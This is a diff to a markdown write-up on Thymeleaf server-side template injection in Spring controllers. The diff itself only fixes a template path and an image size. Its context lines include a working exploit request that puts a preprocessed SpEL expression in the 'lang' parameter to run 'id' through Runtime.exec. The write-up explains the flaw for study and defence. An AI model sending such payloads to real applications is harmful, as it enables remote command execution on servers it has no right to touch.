@@ -22,7 +22,7 @@ Due to the use of `@Controller` and `@GetMapping("/")` annotations, this method 
 Spring framework interprets "welcome" as a View name, and tries to find a file "resources/templates/welcome.html" located in the application resources. If it finds it, it renders the view from the template file and returns to the user.
 If the Thymeleaf view engine is in use (which is the most popular for Spring), the template may look like this:
 
-[welcome.html](src/resources/templates/welcome.html):
+[welcome.html](src/main/resources/templates/welcome.html):
 ```html
 <!DOCTYPE HTML>
 <html lang="en" xmlns:th="http://www.thymeleaf.org">
@@ -71,7 +71,7 @@ So, the aforementioned controllers may be exploited not by path traversal, but b
 ```http
 GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
 ```
-<img src="./exploit.png" width="380px"><br>
+<img src="./exploit.png"><br>
 
 In this exploit we use the power of [expression preprocessing](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/): by surrounding the expression with `__${` and `}__::.x` we can make sure it's executed by thymeleaf no matter what prefixes or suffixes are.
 
